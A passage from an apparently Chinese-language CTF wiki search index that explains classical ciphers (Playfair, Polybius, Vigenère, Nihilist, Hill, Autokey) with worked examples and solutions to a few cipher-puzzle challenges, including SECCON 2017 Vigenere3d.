\u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u884c\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u53f3\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u53f3\u65b9\u5219\u53d6\u6700\u5de6\u65b9\u7684\u5b57\u6bcd\uff09\u3002 \u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u5217\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u4e0b\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u4e0b\u65b9\u5219\u53d6\u6700\u4e0a\u65b9\u7684\u5b57\u6bcd\uff09\u3002 \u65b0\u627e\u5230\u7684\u4e24\u4e2a\u5b57\u6bcd\u5c31\u662f\u539f\u672c\u7684\u4e24\u4e2a\u5b57\u6bcd\u52a0\u5bc6\u7684\u7ed3\u679c\u3002 \u4ee5 playfair example \u4e3a\u5bc6\u5319\uff0c\u5f97 P L A Y F I R E X M B C D G H K N O Q S T U V W Z \u8981\u52a0\u5bc6\u7684\u8baf\u606f\u4e3a Hide the gold in the tree stump HI DE TH EG OL DI NT HE TR EX ES TU MP \u5c31\u4f1a\u5f97\u5230 BM OD ZB XD NA BE KU DM UI XM MO UV IF","title":"\u539f\u7406"},{"location":"crypto/classical/polyalphabetic/#_2","text":"CAP4","title":"\u5de5\u5177"},{"location":"crypto/classical/polyalphabetic/#polybius","text":"","title":"Polybius"},{"location":"crypto/classical/polyalphabetic/#_3","text":"Polybius\u5bc6\u7801\u53c8\u79f0\u4e3a\u68cb\u76d8\u5bc6\u7801\uff0c\u5176\u4e00\u822c\u662f\u5c06\u7ed9\u5b9a\u7684\u660e\u6587\u52a0\u5bc6\u4e3a\u4e24\u4e24\u7ec4\u5408\u7684\u6570\u5b57\uff0c\u5176\u5e38\u7528\u5bc6\u7801\u8868 1 2 3 4 5 1 A B C D E 2 F G H I/J K 3 L M N O P 4 Q R S T U 5 V W X Y Z \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u660e\u6587 HELLO\uff0c\u52a0\u5bc6\u540e\u5c31\u662f 23 15 31 31 34\u3002 \u53e6\u4e00\u79cd\u5bc6\u7801\u8868 A D F G X A b t a l p D d h o z k F q f v s n G g j c u x X m r e w y \u6ce8\u610f\uff0c\u8fd9\u91cc\u5b57\u6bcd\u7684\u987a\u5e8f\u88ab\u6253\u4e71\u4e86\u3002 A D F G X \u7684\u7531\u6765\uff1a 1918 \u5e74\uff0c\u7b2c\u4e00\u6b21\u4e16\u754c\u5927\u6218\u5c06\u8981\u7ed3\u675f\u65f6\uff0c\u6cd5\u519b\u622a\u83b7\u4e86\u4e00\u4efd\u5fb7\u519b\u7535\u62a5\uff0c\u7535\u6587\u4e2d\u7684\u6240\u6709\u5355\u8bcd\u90fd\u7531 A\u3001D\u3001F\u3001G\u3001X \u4e94\u4e2a\u5b57\u6bcd\u62fc\u6210\uff0c\u56e0\u6b64\u88ab\u79f0\u4e3a ADFGX \u5bc6\u7801\u3002ADFGX \u5bc6\u7801\u662f 1918 \u5e74 3 \u6708\u7531\u5fb7\u519b\u4e0a\u6821 Fritz Nebel \u53d1\u660e\u7684\uff0c\u662f\u7ed3\u5408\u4e86 Polybius \u5bc6\u7801\u548c\u7f6e\u6362\u5bc6\u7801\u7684\u53cc\u91cd\u52a0\u5bc6\u65b9\u6848\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0cHELLO\uff0c\u4f7f\u7528\u8fd9\u4e2a\u8868\u683c\u52a0\u5bc6\uff0c\u5c31\u662f DD XF AG AG DF\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/polyalphabetic/#_4","text":"CrypTool","title":"\u5de5\u5177"},{"location":"crypto/classical/polyalphabetic/#vigenere","text":"","title":"Vigenere \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801"},{"location":"crypto/classical/polyalphabetic/#_5","text":"\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff08Vigenere\uff09\u662f\u4f7f\u7528\u4e00\u7cfb\u5217\u51ef\u6492\u5bc6\u7801\u7ec4\u6210\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5c5e\u4e8e\u591a\u8868\u5bc6\u7801\u7684\u4e00\u79cd\u7b80\u5355\u5f62\u5f0f\u3002 \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1acome greatwall \u5bc6\u94a5\uff1acrypto \u9996\u5148\uff0c\u5bf9\u5bc6\u94a5\u8fdb\u884c\u586b\u5145\u4f7f\u5176\u957f\u5ea6\u4e0e\u660e\u6587\u957f\u5ea6\u4e00\u6837\u3002 \u660e\u6587 c o m e g r e a t w a l l \u5bc6\u94a5 c r y p t o c r y p t o c \u5176\u6b21\uff0c\u67e5\u8868\u5f97\u5bc6\u6587 \u660e\u6587\uff1acome greatwall \u5bc6\u94a5\uff1acrypto \u5bc6\u6587\uff1aefkt zferrltzn","title":"\u539f\u7406"},{"location":"crypto/classical/polyalphabetic/#_6","text":"\u5bf9\u5305\u62ec\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5728\u5185\u7684\u6240\u6709\u591a\u8868\u5bc6\u7801\u7684\u7834\u8bd1\u90fd\u662f\u4ee5\u5b57\u6bcd\u9891\u7387\u4e3a\u57fa\u7840\u7684\uff0c\u4f46\u76f4\u63a5\u7684\u9891\u7387\u5206\u6790\u5374\u5e76\u4e0d\u9002\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u4e2d\uff0c\u4e00\u4e2a\u5b57\u6bcd\u53ef\u4ee5\u88ab\u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff0c\u56e0\u800c\u7b80\u5355\u7684\u9891\u7387\u5206\u6790\u5728\u8fd9\u91cc\u5e76\u6ca1\u6709\u7528\u3002 \u7834\u8bd1\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u5b83\u7684\u5bc6\u94a5\u662f\u5faa\u73af\u91cd\u590d\u7684\u3002 \u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u5bc6\u94a5\u7684\u957f\u5ea6\uff0c\u90a3\u5bc6\u6587\u5c31\u53ef\u4ee5\u88ab\u770b\u4f5c\u662f\u4ea4\u7ec7\u5728\u4e00\u8d77\u7684\u51ef\u6492\u5bc6\u7801\uff0c\u800c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u90fd\u53ef\u4ee5\u5355\u72ec\u7834\u89e3\u3002\u5173\u4e8e\u5bc6\u7801\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u53ef\u4ee5 \u4f7f\u7528\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u548c\u5f17\u91cc\u5fb7\u66fc\u8bd5\u9a8c\u6765\u83b7\u53d6\u3002 \u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u662f\u57fa\u4e8e\u7c7b\u4f3c the \u8fd9\u6837\u7684\u5e38\u7528\u5355\u8bcd\u6709\u53ef\u80fd\u88ab\u540c\u6837\u7684\u5bc6\u94a5\u5b57\u6bcd\u8fdb\u884c\u52a0\u5bc6\uff0c\u4ece\u800c\u5728\u5bc6\u6587\u4e2d\u91cd\u590d\u51fa\u73b0\u3002\u4f8b\u5982\uff0c\u660e\u6587\u4e2d\u4e0d\u540c\u7684 CRYPTO \u53ef\u80fd\u88ab\u5bc6\u94a5 ABCDEF \u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff1a \u5bc6\u94a5\uff1aABCDEF AB CDEFA BCD EFABCDEFABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6\u6587\uff1aCSASXT IT UKSWT GQU GWYQVRKWAQJB \u6b64\u65f6\u660e\u6587\u4e2d\u91cd\u590d\u7684\u5143\u7d20\u5728\u5bc6\u6587\u4e2d\u5e76\u4e0d\u91cd\u590d\u3002\u7136\u800c\uff0c\u5982\u679c\u5bc6\u94a5\u76f8\u540c\u7684\u8bdd\uff0c\u7ed3\u679c\u53ef\u80fd\u4fbf\u4e3a\uff08\u4f7f\u7528\u5bc6\u94a5 ABCD\uff09\uff1a \u5bc6\u94a5\uff1aABCDAB CD ABCDA BCD ABCDABCDABCD \u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY \u5bc6\u6587\uff1aCSASTP KV SIQUT GQU CSASTPIUAQJB \u6b64\u65f6\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u5c31\u80fd\u4ea7\u751f\u6548\u679c\u3002\u5bf9\u4e8e\u66f4\u957f\u7684\u6bb5\u843d\u6b64\u65b9\u6cd5\u66f4\u4e3a\u6709\u6548\uff0c\u56e0\u4e3a\u901a\u5e38\u5bc6\u6587\u4e2d\u91cd\u590d\u7684\u7247\u6bb5\u4f1a\u66f4\u591a\u3002\u5982\u901a\u8fc7\u4e0b\u9762\u7684\u5bc6\u6587\u5c31\u80fd\u7834\u8bd1\u51fa\u5bc6\u94a5\u7684\u957f\u5ea6\uff1a \u5bc6\u6587\uff1aDYDUXRMHTVDVNQDQNWDYDUXRMHARTJGWNQD \u5176\u4e2d\uff0c\u4e24\u4e2a DYDUXRMH \u7684\u51fa\u73b0\u76f8\u9694\u4e86 18 \u4e2a\u5b57\u6bcd\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u5047\u5b9a\u5bc6\u94a5\u7684\u957f\u5ea6\u662f 18 \u7684\u7ea6\u6570\uff0c\u5373\u957f\u5ea6\u4e3a 18\u30019\u30016\u30013 \u6216 2\u3002\u800c\u4e24\u4e2a NQD \u5219\u76f8\u8ddd 20 \u4e2a\u5b57\u6bcd\uff0c\u610f\u5473\u7740\u5bc6\u94a5\u957f\u5ea6\u5e94\u4e3a 20\u300110\u30015\u30014 \u6216 2\u3002\u53d6\u4e24\u8005\u7684\u4ea4\u96c6\uff0c\u5219\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u5bc6\u94a5\u957f\u5ea6\u4e3a 2\u3002\u63a5\u4e0b\u6765\u5c31\u662f\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u64cd\u4f5c\u4e86\u3002 \u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u7834\u89e3\u539f\u7406\uff0c\u8fd9\u91cc\u6682\u65f6\u4e0d\u505a\u8fc7\u591a\u7684\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003http:// www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/ \u3002","title":"\u7834\u89e3"},{"location":"crypto/classical/polyalphabetic/#_7","text":"\u5df2\u77e5\u5bc6\u94a5 Python \u7684 pycipher \u5e93 \u5728\u7ebf\u89e3\u5bc6 Vigen\u00e8re cipher CAP4 \u672a\u77e5\u5bc6\u94a5 Vigen\u00e8re Cipher Codebreaker Vigenere Solver \uff0c\u4e0d\u591f\u5b8c\u5584\u3002","title":"\u5de5\u5177"},{"location":"crypto/classical/polyalphabetic/#nihilist","text":"","title":"Nihilist"},{"location":"crypto/classical/polyalphabetic/#_8","text":"Nihilist\u5bc6\u7801\u53c8\u79f0\u5173\u952e\u5b57\u5bc6\u7801\uff1a\u660e\u6587 + \u5173\u952e\u5b57 = \u5bc6\u6587\u3002\u4ee5\u5173\u952e\u5b57 helloworld \u4e3a\u4f8b\u3002 \u9996\u5148\u5229\u7528\u5bc6\u94a5\u6784\u9020\u68cb\u76d8\u77e9\u9635\uff08\u7c7b\u4f3c Polybius \u5bc6\u7801\uff09 - \u65b0\u5efa\u4e00\u4e2a 5 \u00d7 5 \u77e9\u9635 - \u5c06\u5b57\u7b26\u4e0d\u91cd\u590d\u5730\u4f9d\u6b21\u586b\u5165\u77e9\u9635 - \u5269\u4e0b\u90e8\u5206\u6309\u5b57\u6bcd\u987a\u5e8f\u586b\u5165 - \u5b57\u6bcd i \u548c j \u7b49\u4ef7 1 2 3 4 5 1 h e l o w 2 r d a b c 3 f g i / j k m 4 n p q s t 5 u v x y z \u5bf9\u4e8e\u52a0\u5bc6\u8fc7\u7a0b\u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u52a0\u5bc6\uff1a a -> M[2,3] -> 23 t -> M[4,5] -> 45 \u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b \u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u89e3\u5bc6\uff1a 23 -> M[2,3] -> a 45 -> M[4,5] -> t \u53ef\u4ee5\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u7279\u5f81\u6709\u5982\u4e0b\u51e0\u70b9 \u7eaf\u6570\u5b57 \u53ea\u5305\u542b 1 \u5230 5 \u5bc6\u6587\u957f\u5ea6\u5076\u6570\u3002","title":"\u539f\u7406"},{"location":"crypto/classical/polyalphabetic/#hill","text":"","title":"Hill"},{"location":"crypto/classical/polyalphabetic/#_9","text":"\u5e0c\u5c14\u5bc6\u7801\uff08Hill\uff09\u4f7f\u7528\u6bcf\u4e2a\u5b57\u6bcd\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u4f5c\u4e3a\u5176\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u5373A=0\uff0cB=1\uff0cC=2 \u7b49\uff0c\u7136\u540e\u5c06\u660e\u6587\u8f6c\u5316\u4e3a n \u7ef4\u5411\u91cf\uff0c\u8ddf\u4e00\u4e2a n \u00d7 n \u7684\u77e9\u9635\u76f8\u4e58\uff0c\u518d\u5c06\u5f97\u51fa\u7684\u7ed3\u679c\u6a21 26\u3002\u6ce8\u610f\u7528\u4f5c\u52a0\u5bc6\u7684\u77e9\u9635\uff08\u5373\u5bc6\u5319\uff09\u5728 \\mathbb{Z}_{26}^{n} \\mathbb{Z}_{26}^{n} \u5fc5\u987b\u662f\u53ef\u9006\u7684\uff0c\u5426\u5219\u5c31\u4e0d\u53ef\u80fd\u89e3\u7801\u3002\u53ea\u6709\u77e9\u9635\u7684\u884c\u5217\u5f0f\u548c 26 \u4e92\u8d28\uff0c\u624d\u662f\u53ef\u9006\u7684\u3002\u4e0b\u9762\u4e3e\u4e00\u4e2a\u4f8b\u5b50 \u660e\u6587\uff1aACT \u5c06\u660e\u6587\u5316\u4e3a\u77e9\u9635\u3002 \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \u5047\u8bbe\u5bc6\u94a5\u4e3a\uff1a \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \u52a0\u5bc6\u8fc7\u7a0b\u4e3a\uff1a \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\equiv \\begin{bmatrix} 67\\\\ 222\\\\ 319 \\end{bmatrix} \\equiv \\begin{bmatrix} 15\\\\ 14\\\\ 7 \\end{bmatrix} \\bmod 26 \\begin{bmatrix} 6 & 24 & 1\\\\ 13 & 16 & 10\\\\ 20 & 17 & 15 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\equiv \\begin{bmatrix} 67\\\\ 222\\\\ 319 \\end{bmatrix} \\equiv \\begin{bmatrix} 15\\\\ 14\\\\ 7 \\end{bmatrix} \\bmod 26 \u5bc6\u6587\u5373\u4e3a \u5bc6\u6587\uff1aPOH","title":"\u539f\u7406"},{"location":"crypto/classical/polyalphabetic/#_10","text":"http://www.practicalcryptography.com/ciphers/hill-cipher/ CAP4 Cryptool","title":"\u5de5\u5177"},{"location":"crypto/classical/polyalphabetic/#_11","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5ISCC 2015 base decrypt 150\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u4e3a \u5bc6\u6587\uff1a 22,09,00,12,03,01,10,03,04,08,01,17 \uff08wjamdbkdeibr\uff09 \u4f7f\u7528\u7684\u77e9\u9635\u662f 1 2 3 4 5 6 7 8 10 \u8bf7\u5bf9\u5bc6\u6587\u89e3\u5bc6. \u9996\u5148\uff0c\u77e9\u9635\u662f 3 \u00d7 3 \u7684\u3002\u8bf4\u660e\u6bcf\u6b21\u52a0\u5bc63\u4e2a\u5b57\u7b26\u3002\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 Cryptool\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u77e9\u9635\u662f\u6309\u7167\u5217\u6765\u6392\u5e03\u7684\u3002\u5373\u5982\u4e0b 1 4 7 2 5 8 3 6 10 \u6700\u540e\u7684\u7ed3\u679c\u4e3a overthehillx \u3002","title":"\u4f8b\u5b50"},{"location":"crypto/classical/polyalphabetic/#autokeycipher","text":"","title":"AutokeyCipher"},{"location":"crypto/classical/polyalphabetic/#_12","text":"\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\uff08Autokey Cipher\uff09\u4e5f\u662f\u591a\u8868\u66ff\u6362\u5bc6\u7801\uff0c\u4e0e\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4f46\u4f7f\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\u751f\u6210\u5bc6\u94a5\u3002\u901a\u5e38\u6765\u8bf4\u5b83\u8981\u6bd4\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u66f4\u5b89\u5168\u3002\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u4e3b\u8981\u6709\u4e24\u79cd\uff0c\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u548c\u539f\u6587\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u3002\u4e0b\u9762\u6211\u4eec\u4ee5\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u4e3a\u4f8b\uff1a \u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG \u5173\u952e\u8bcd\uff1aCULTURE \u81ea\u52a8\u751f\u6210\u5bc6\u94a5\uff1a CULTURE THE QUICK BROWN FOX JUMPS OVER THE \u63a5\u4e0b\u6765\u7684\u52a0\u5bc6\u8fc7\u7a0b\u548c\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4ece\u76f8\u5e94\u7684\u8868\u683c\u53ef\u5f97\uff1a \u5bc6\u6587 VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK","title":"\u539f\u7406"},{"location":"crypto/classical/polyalphabetic/#_13","text":"\u5df2\u77e5\u5173\u952e\u8bcd Python \u7684 pycipher \u5e93 \u672a\u77e5\u5173\u952e\u8bcd http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/ tools \u6587\u4ef6\u5939\u4e0b break_autokey.py\uff0c\u5f85\u5b8c\u6210\u3002","title":"\u5de5\u5177"},{"location":"crypto/classical/summary/","text":"\u603b\u7ed3 \u00b6 \u7ecf\u9a8c \u00b6 \u53e4\u5178\u5bc6\u7801\u7684\u57fa\u672c\u89e3\u9898\u601d\u8def\u53ef\u4ee5\u603b\u7ed3\u5982\u4e0b \u5df2\u77e5\u5bc6\u7801\uff0c\u8bc6\u522b\u5bc6\u7801 \u672a\u77e5\u5bc6\u7801\uff0c\u5206\u6790\u5bc6\u7801\u7279\u6027\uff0c\u5229\u7528\u66b4\u529b\u7834\u89e3\u6216\u8005\u76f8\u5e94\u601d\u8def\u6c42\u89e3 \u6709\u4ee5\u4e0b\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u7528\u6765\u8bc6\u522b\u5bc6\u7801 \u52a0\u5bc6\u65b9\u5f0f\u5224\u522b \u5b57\u7b26\u96c6\u5224\u522b \u52a0\u5bc6\u7ed3\u679c\u6837\u5b50\u5224\u522b \u5b9e\u9a8c\u5427 \u56f4\u5728\u6805\u680f\u91cc\u7684\u7231 \u00b6 \u9898\u76ee\u63cf\u8ff0 \u6700\u8fd1\u4e00\u76f4\u5728\u597d\u5947\u4e00\u4e2a\u95ee\u9898\uff0cQWE\u5230\u5e95\u7b49\u4e0d\u7b49\u4e8eABC\uff1f -.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- --- flag\u683c\u5f0f\uff1aCTF{xxx} \u9996\u5148\uff0c\u6839\u636e\u5bc6\u7801\u6837\u5f0f\u5224\u65ad\u662f\u6469\u65af\u7535\u7801\uff0c\u89e3\u5bc6\u540e\u5f97\u5230 KIQLWTFCQGNSOO \uff0c\u770b\u7740\u4e5f\u4e0d\u50cf flag\uff0c\u9898\u76ee\u4e2d\u8fd8\u6709\u8fd8\u6709\u6805\u680f\u4e0e QWE\u5230\u5e95\u7b49\u4e0d\u7b49\u4e8eABC \uff0c\u4e24\u4e2a\u90fd\u8bd5\u4e86\u8bd5\u4e4b\u540e\uff0c\u53d1\u73b0\u662f\u5148 QWE \u7136\u540e\u6805\u680f\u53ef\u5f97\u5230\u7ed3\u679c\u3002 \u9996\u5148\u952e\u76d8 QWE \u89e3\u5bc6\uff0c\u8bd5\u7740\u89e3\u5bc6\u5f97\u5230 IILYOAVNEBSAHR \u3002\u7ee7\u800c\u6805\u680f\u89e3\u5bc6\u5f97\u5230 ILOVESHIYANBAR \u3002 2017 SECCON Vigenere3d \u00b6 \u7a0b\u5e8f\u5982\u4e0b # Vigenere3d.py import sys def _l ( idx , s ): return s [ idx :] + s [: idx ] def main ( p , k1 , k2 ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 c = \"\" for a in p : c += t [ s . find ( a )][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] i1 = ( i1 + 1 ) % len ( k1 ) i2 = ( i2 + 1 ) % len ( k2 ) return c print main ( sys . argv [ 1 ], sys . argv [ 2 ], sys . argv [ 2 ][:: - 1 ]) $ python Vigenere3d . py SECCON { ************************** } ************** POR4dnyTLHBfwbxAAZhe }} ocZR3Cxcftw9 \u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u5206\u6790\u4e00\u4e0b t \u7684\u6784\u6210 t[i][j]=s[i+j:]+s[:i+j] \\\\ t[i][k]=s[i+k:]+s[:i+k] t[i][j]=s[i+j:]+s[:i+j] \\\\ t[i][k]=s[i+k:]+s[:i+k] t[i][j][k] t[i][j][k] \u4e3a t[i][j] t[i][j] \u4e2d\u7684\u7b2c k \u4e2a\u5b57\u7b26\uff0c t[i][k][j] t[i][k][j] \u4e3a t[i][k] t[i][k] \u4e2d\u7684\u7b2c j \u4e2a\u5b57\u7b26\u3002\u65e0\u8bba\u662f i+j+k i+j+k \u662f\u5426\u8d85\u8fc7 len(s) \u4e24\u8005\u90fd\u59cb\u7ec8\u4fdd\u6301\u4e00\u81f4\uff0c\u5373 t[i][j][k]=t[i][k][j] t[i][j][k]=t[i][k][j] \u3002 \u6545\u800c\uff0c\u5176\u5b9e\u5bf9\u4e8e\u76f8\u540c\u7684\u660e\u6587\u6765\u8bf4\uff0c\u53ef\u80fd\u6709\u591a\u4e2a\u5bc6\u94a5\u4f7f\u5176\u751f\u6210\u76f8\u540c\u7684\u5bc6\u6587\u3002 \u7136\u800c\u4e0a\u9762\u5206\u6790\u5c31\u662f\u5355\u7eaf\u5730\u5206\u6790\u800c\u5df2\uff0c\uff0c\u4e0b\u9762\u5f00\u59cb\u6b63\u9898\u3002 \u4e0d\u96be\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u6bcf\u4e00\u4f4d\u53ea\u4e0e\u660e\u6587\u7684\u76f8\u5e94\u4f4d\u76f8\u5173\uff0c\u800c\u4e14\uff0c\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u7684\u7a7a\u95f4\u6700\u5927\u4e5f\u5c31\u662f s \u7684\u5927\u5c0f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7206\u7834\u6765\u83b7\u53d6\u5bc6\u94a5\u3002\u8fd9\u91cc\u6839\u636e\u4e0a\u8ff0\u547d\u4ee4\u884c\u63d0\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u5bc6\u94a5\u957f\u5ea6\u4e3a 14\uff0c\u6070\u597d\u660e\u6587\u524d\u97627\u4e2a\u5b57\u8282\u5df2\u77e5\u3002\u6062\u590d\u5bc6\u94a5\u7684 exp \u5982\u4e0b def get_key ( plain , cipher ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 key = [ '*' ] * 14 for i in range ( len ( plain )): for i1 in range ( len ( s )): for i2 in range ( len ( s )): if t [ s . find ( plain [ i ])][ s . find ( s [ i1 ])][ s . find ( s [ i2 ])] == cipher [ i ]: key [ i ] = s [ i1 ] key [ 13 - i ] = s [ i2 ] return '' . join ( key ) \u6062\u590d\u660e\u6587\u7684\u811a\u672c\u5982\u4e0b def decrypt ( cipher , k1 , k2 ): s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\" t = [[ _l (( i + j ) % len ( s ), s ) for j in range ( len ( s ))] for i in range ( len ( s ))] i1 = 0 i2 = 0 plain = \"\" for a in cipher : for i in range ( len ( s )): if t [ i ][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] == a : plain += s [ i ] break i1 = ( i1 + 1 ) % len ( k1 ) i2 = ( i2 + 1 ) % len ( k2 ) return plain \u5f97\u5230\u660e\u6587\u5982\u4e0b \u279c 2017_seccon_vigenere3d git: ( master ) python exp.py SECCON { Welc0me_to_SECCON_CTF_2017 } \u6d88\u5931\u7684\u4e09\u91cd\u5bc6\u7801 \u00b6 \u5bc6\u6587 of zit kggd zitkt qkt ygxk ortfzoeqs wqlatzwqssl qfr zvg ortfzoeqs yggzwqssl. fgv oy ngx vqfz zg hxz zitd of gft soft.piv dgfn lgsxzogfl qkt zitkt? zohl:hstqlt eiqfut zit ygkd gy zit fxdwtk ngx utz.zit hkgukqddtkl! \u4f7f\u7528 quipquip \u76f4\u63a5\u89e3\u5bc6\u3002","title":"\u603b\u7ed3"},{"location":"crypto/classical/summary/#_1","text":"","title":"\u603b\u7ed3"},{"location":"crypto/classical/summary/#_2","text":"\u53e4\u5178\u5bc6\u7801\u7684\u57fa\u672c\u89e3\u9898\u601d\u8def\u53ef\u4ee5\u603b\u7ed3\u5982\u4e0b \u5df2\u77e5\u5bc6\u7801\uff0c\u8bc6\u522b\u5bc6\u7801 \u672a\u77e5\u5bc6\u7801\uff0c\u5206\u6790\u5bc6\u7801\u7279\u6027\uff0c\u5229\u7528\u66b4\u529b\u7834\u89e3\u6216\u8005\u76f8\u5e94\u601d\u8def\u6c42\u89e3 \u6709\u4ee5\u4e0b\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u7528\u6765\u8bc6\u522b\u5bc6\u7801 \u52a0\u5bc6\u65b9\u5f0f\u5224\u522b \u5b57\u7b26\u96c6\u5224\u522b \u52a0\u5bc6\u7ed3\u679c\u6837\u5b50\u5224\u522b","title":"\u7ecf\u9a8c"},{"location":"crypto/classical/summary/#_3","text":"\u9898\u76ee\u63cf\u8ff0 \u6700\u8fd1\u4e00\u76f4\u5728\u597d\u5947\u4e00\u4e2a\u95ee\u9898\uff0cQWE\u5230\u5e95\u7b49\u4e0d\u7b49\u4e8eABC\uff1f -.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- --- flag\u683c\u5f0f\uff1aCTF{xxx} \u9996\u5148\uff0c\u6839\u636e\u5bc6\u7801\u6837\u5f0f\u5224\u65ad\u662f\u6469\u65af\u7535\u7801\uff0c\u89e3\u5bc6\u540e\u5f97\u5230 KIQLWTFCQGNSOO \uff0c\u770b\u7740\u4e5f\u4e0d\u50cf flag\uff0c\u9898\u76ee\u4e2d\u8fd8\u6709\u8fd8\u6709\u6805\u680f\u4e0e QWE\u5230\u5e95\u7b49\u4e0d\u7b49\u4e8eABC \uff0c\u4e24\u4e2a\u90fd\u8bd5\u4e86\u8bd5\u4e4b\u540e\uff0c\u53d1\u73b0\u662f\u5148 QWE \u7136\u540e\u6805\u680f\u53ef\u5f97\u5230\u7ed3\u679c\u3002 \u9996\u5148\u952e\u76d8 QWE \u89e3\u5bc6\uff0c\u8bd5\u7740\u89e3\u5bc6\u5f97\u5230 IILYOAVNEBSAHR \u3002\u7ee7\u800c\u6805\u680f\u89e3\u5bc6\u5f97\u5230 ILOVESHIYANBAR \u3002","title":"\u5b9e\u9a8c\u5427 \u56f4\u5728\u6805\u680f\u91cc\u7684\u7231"},{"location":"crypto/classical/summary/#2017-seccon-vigenere3d","text":"\u7a0b\u5e8f\u5982\u4e0b # Vigenere3d.py import sys def _l ( idx , s ): return s [ idx :] + s [: idx ] def main ( p , k1 , k2 ): s = 